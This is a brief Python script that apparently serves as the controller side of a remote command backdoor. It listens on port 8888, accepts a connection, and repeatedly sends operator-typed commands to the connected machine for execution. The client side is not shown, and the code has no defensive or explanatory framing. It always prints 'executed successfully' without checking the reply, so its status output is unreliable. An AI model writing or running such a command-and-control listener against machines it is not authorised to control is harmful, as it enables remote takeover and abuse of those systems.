import socket
import os

s = socket.socket()
host = socket.gethostname()
port = 8888
s.bind((host,port))
print('')
print('sever running ',host)
print('')
print('Waiting for any incoming connections...')
s.listen(1)
conn, addr = s.accept()
print('')
print(addr,' Has connected to the server successfully')
while 1:
    command = input((str('Command >> ')))
    conn.send(command.encode())
    print('')
    print('Command sent waiting for execution ...')
    print('')
    conn.recv(1024)
    print('Command has been executed successfully')
    
